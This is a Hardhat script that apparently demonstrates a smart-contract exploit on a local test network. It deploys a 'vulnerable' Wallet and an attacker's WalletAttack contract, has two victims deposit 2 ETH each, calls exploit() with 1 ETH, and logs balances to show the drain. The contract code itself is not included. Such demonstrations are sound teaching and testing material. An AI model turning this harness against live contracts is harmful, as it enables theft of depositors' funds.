const hre = require("hardhat");
const ethers = hre.ethers;

async function main() {
  // Get accounts
  const [owner, attacker, victim1, victim2] = await ethers.getSigners();

  // Deploy Vulnerable Wallet
  const Wallet = await ethers.getContractFactory("Wallet");
  const wallet = await Wallet.deploy();
  await wallet.waitForDeployment();
  const walletAddress = await wallet.getAddress();

  // Deploy Attack Contract
  const WalletAttack = await ethers.getContractFactory("WalletAttack");
  const walletAttack = await WalletAttack.connect(attacker).deploy();
  await walletAttack.waitForDeployment();
  const attackContractAddress = await walletAttack.getAddress();

  // Victims deposit funds (4 ETH total)
  console.log("\nVictims depositing funds...");
  await wallet.connect(victim1).deposit({ value: ethers.parseEther("2.0") });
  await wallet.connect(victim2).deposit({ value: ethers.parseEther("2.0") });

  console.log("Initial State:");
  console.log("Wallet Balance:", 
    ethers.formatEther(await ethers.provider.getBalance(walletAddress)), "ETH");
  console.log("Attacker Balance:", 
    ethers.formatEther(await ethers.provider.getBalance(attacker.address)), "ETH");

  console.log("\nPerforming attack...");
  // Perform the attack with 1 ETH
  const attackTx = await walletAttack.connect(attacker).exploit(walletAddress, { 
    value: ethers.parseEther("1.0") 
  });
  await attackTx.wait();

  console.log("\nFinal State:");
  console.log("Wallet Balance:", 
    ethers.formatEther(await ethers.provider.getBalance(walletAddress)), "ETH");
  console.log("Attacker Balance:", 
    ethers.formatEther(await ethers.provider.getBalance(attacker.address)), "ETH");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
